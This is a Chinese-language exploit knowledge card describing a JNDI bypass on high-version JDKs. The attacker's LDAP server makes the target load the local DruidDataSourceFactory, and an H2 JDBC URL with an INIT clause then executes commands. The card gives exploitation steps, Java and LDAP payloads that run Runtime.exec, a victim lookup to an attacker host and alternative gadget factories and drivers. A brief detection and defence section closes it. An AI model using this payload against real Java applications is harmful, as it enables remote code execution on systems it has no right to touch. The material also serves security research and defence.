---
id: web-java-deserialization-jndi-druid-datasource-factory-h2-init
title: 高版本 JNDI 绕过：DruidDataSourceFactory 本地工厂解析 Reference 属性触发 H2 INIT RCE
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-high-version-druid-datasource-factory-h2-init
aliases:
- DruidDataSourceFactory
- com.alibaba.druid.pool.DruidDataSourceFactory
- Druid 本地工厂
- Druid JNDI 绕过
- druid-spring-boot-starter JNDI
- DruidDataSourceFactory H2 INIT
tags:
- java
- jndi
- ldap
- high-version
- objectfactory
- local-factory
- druid
- jdbc
- h2
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V235
  verified_at: '2026-11-07T09:35:39+08:00'
  notes: 已对照原文与图01-11核对：高版本 trustURLCodebase=false、本地 loadClassWithoutInit 命中 DruidDataSourceFactory、className 校验 javax.sql.DataSource、ALL_PROPERTIES→createDataSourceInternal/config、H2 INIT CREATE ALIAS Runtime.exec 弹计算器均一致；与 Tomcat/vibur 本地工厂卡按工厂类区分，dedup likely_duplicate 判为不同 classpath 目标保留。未验证点：未在本机复现。frontmatter 无 sources/source_url。
---

## 一句话结论

JDK 高版本默认关闭 LDAP 远程 codebase（`com.sun.jndi.ldap.object.trustURLCodebase=false`）后，只要目标 classpath 存在 Druid 连接池，就可以让 LDAP 返回的 `Reference` 把 `factoryClassName` 指向本地 `com.alibaba.druid.pool.DruidDataSourceFactory`：JNDI 从本地加载该工厂，工厂把 `RefAddr` 读成 Properties 并创建、初始化 `DruidDataSource`，用其中的 `driverClassName`/`url` 建立 JDBC 连接；把 url 换成带 `INIT=CREATE ALIAS ... CALL ...` 的 H2 JDBC URL 即可执行任意 Java 代码。

## 原理

- `DirectoryManager.getObjectInstance()` 遇到 `Reference` 时走 `getObjectFactoryFromReference(ref, factoryName)`：第一步是 `helper.loadClassWithoutInit(factoryName)`，即优先从**本地 classpath** 加载工厂类；只有本地 `ClassNotFoundException` 且 `ref.getFactoryClassLocation() != null` 时才走 `helper.loadClass(factoryName, codebase)`，而后者受 `TRUST_URL_CODE_BASE` 控制，高版本默认为 false（由 `com.sun.jndi.ldap.object.trustURLCodebase` 决定）。因此“工厂类在本地 classpath”这一分支完全不依赖远程类加载。
- 本地加载后还会经过 `ObjectFactoriesFilter.canInstantiateObjectsFactory(clas)` 检查；Druid 的工厂实现 `javax.naming.spi.ObjectFactory`，默认过滤策略允许常规工厂类，除非部署方配置了更严格的 `jdk.jndi.object.factoriesFilter`。
- `com.alibaba.druid.pool.DruidDataSourceFactory.getObjectInstance()` 先校验 `ref.getClassName()` 必须等于 `javax.sql.DataSource` 或 `com.alibaba.druid.pool.DruidDataSource`，否则返回 null；随后遍历 `ALL_PROPERTIES`，把 Reference 中同名的 `RefAddr` 内容写入 `Properties`，调用 `createDataSourceInternal(properties)`。
- `createDataSourceInternal` 新建 `DruidDataSource` 并进入 `config(dataSource, properties)`：逐个解析并调用 `setDriverClassName`、`setUrl`、`setInitialSize` 等 setter，配置完成后按 `init` 属性触发 `dataSource.init()`（原文调试即停在此处）。初始化连接池时 Druid 用 `driverClassName` 加载驱动并以 `url` 建立物理连接。
- 把 url 设为 H2 JDBC URL，嵌入 `INIT=CREATE ALIAS EXEC AS '<Java 源码>';CALL EXEC(...)`：H2 在连接初始化阶段解析 INIT，编译执行别名定义并调用，最终执行 `Runtime.getRuntime().exec()`。整条链从 JNDI lookup 到命令执行都不需要远程类加载或反序列化数据。

## 触发条件

- 存在攻击者可控的 JNDI `InitialContext.lookup()`（典型为 LDAP 入口），目标可出网访问攻击者 LDAP 服务。
- 目标 JDK 为高版本（原文在 JDK 11 验证），`trustURLCodebase` 已默认 false，但仍有本地工厂分支可用。
- 目标 classpath 含 Druid（原文测试依赖 `druid-spring-boot-starter` 1.2.8，提供 `com.alibaba.druid.pool.DruidDataSourceFactory`），且 `ObjectFactoriesFilter` 未禁止该类。
- classpath 上存在可被 url 参数驱动的 JDBC 驱动（原文用 H2；`driverClassName=org.h2.Driver` 与对应 H2 驱动可达）；若目标不能出网访问数据库地址，或驱动不支持危险 URL 参数，则链断。
- 攻击者能返回带 `javaNamingReference`/`javaFactory` 属性的 LDAP Reference 响应。

## 利用步骤

1. 确认 JNDI 入口与目标 JDK 版本，确认 classpath 有 Druid（如 Spring Boot 项目引入 druid-spring-boot-starter）和可用的 JDBC 驱动。
2. 攻击者启动恶意 LDAP 服务，对查询返回 Reference：
   - `className=javax.sql.DataSource`（Druid 工厂的硬性校验值）；
   - `factoryClassName=com.alibaba.druid.pool.DruidDataSourceFactory`；
   - `factoryClassLocation` 为空/不设置，强制走本地 classpath；
   - RefAddr：`driverClassName=org.h2.Driver`、`url=<带 INIT 的 H2 URL>`、`init=true`、`initialSize=1`（原文工具生成的属性还包含空的 initialSize）。
3. 受害者执行 `lookup("ldap://attacker:port/xxx")`，JNDI 本地加载 Druid 工厂并调用 `getObjectInstance`。
4. `createDataSourceInternal` → `config` → `dataSource.init()` 建立 H2 连接，H2 解析 `INIT` 中的 `CREATE ALIAS`/`CALL`，执行命令（原文弹出计算器）。
5. 无回显场景可用 DNS/HTTP 外带或写文件；Windows/Linux 命令按目标平台替换。

## PoC

攻击者侧构造 Reference（实际投递方式可为 LDAP `javaNamingReference` 属性或 RMI `ReferenceWrapper`）：

```java
Reference ref = new Reference(
    "javax.sql.DataSource",
    "com.alibaba.druid.pool.DruidDataSourceFactory",
    null); // factoryClassLocation 为空，强制本地加载

String jdbcUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;"
    + "INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception "
    + "{Runtime.getRuntime().exec(cmd);}';CALL EXEC ('cmd /c calc')";

ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("url", jdbcUrl));
ref.add(new StringRefAddr("init", "true"));
ref.add(new StringRefAddr("initialSize", "1"));
```

LDAP 服务端对查询返回同一 Reference（等价属性）：

```text
objectClass: javaNamingReference
javaClassName: javax.sql.DataSource
javaFactory: com.alibaba.druid.pool.DruidDataSourceFactory
javaReferenceAddress: /0/url/<上述 jdbcUrl>
javaReferenceAddress: /1/driverClassName/org.h2.Driver
javaReferenceAddress: /2/init/true
javaReferenceAddress: /3/initialSize/1
```

受害者侧：

```java
new InitialContext().lookup("ldap://127.0.0.1:50389/xxx");
```

关键调用链（原文调试）：

```text
getObjectInstance:160, DirectoryManager (javax.naming.spi)
→ getObjectFactoryFromReference（本地 loadClassWithoutInit 命中 DruidDataSourceFactory）
→ DruidDataSourceFactory.getObjectInstance
→ createDataSourceInternal → config（解析 driverClassName/url/init）
→ DruidDataSource.init() → H2 Driver 解析 INIT → CREATE ALIAS / CALL → Runtime.exec
```

## 变体与关联

- 本地工厂可替换：Tomcat `org.apache.tomcat.jdbc.pool.DataSourceFactory`、Tomcat `org.apache.naming.factory.ResourceFactory`/`BeanFactory`、vibur-dbcp `ViburDBCPObjectFactory`、c3p0 `JavaBeanObjectFactory` 等；Druid 分支的特点是对 `className` 有固定校验，且属性名取自 `ALL_PROPERTIES`。
- JDBC 驱动可替换：除 H2 `INIT` 外，还可接 MySQL `autoDeserialize`/`ServerStatusDiffInterceptor`、PostgreSQL `socketFactory` XML 等，把本地工厂变成任意 JDBC URL 的二次入口。
- 入口可替换：LDAP `decodeReference` 与 RMI `ReferenceWrapper` 均可；RMI 侧还需注意 `classFactoryLocation` 为空以避开 `trustURLCodebase` 检查。
- 关联 [[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]：同为“本地工厂 + JDBC + H2 INIT”，但本卡工厂为 Druid 且属性集合不同；关联 [[web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc]]、[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]。
- 边界：classpath 无 Druid、无可用 JDBC 驱动、工厂被 `ObjectFactoriesFilter` 拒绝或目标不能出网时链不成立；仅能建立 JDBC 连接而无危险驱动参数时危害止于 SSRF/任意 TCP 连接。

## 检测与防御

- 禁止将用户可控输入传给 `InitialContext.lookup`；对协议、目标地址与返回的 Reference 做白名单校验。
- 用 `jdk.jndi.object.factoriesFilter` 拒绝 `com.alibaba.druid.pool.DruidDataSourceFactory` 及同类数据源工厂；移除不必要的 Druid/连接池依赖。
- 保持高版本 JVM 的 `trustURLCodebase=false`、`trustSerialData=false`，但这只能封远程 codebase/序列化分支，不能阻止本地工厂，仍需应用层限制。
- 禁止外部可控的 JDBC url/driverClassName；升级并限制 H2，禁用 `INIT`/`CREATE ALIAS` 等初始化能力；驱动类白名单。
- 网络层限制应用出站访问 LDAP/RMI/数据库端口；检测 LDAP 响应中出现 `javaFactory` 指向 Druid/JDBC 工厂、短时间内的 JDBC 建连与子进程创建。
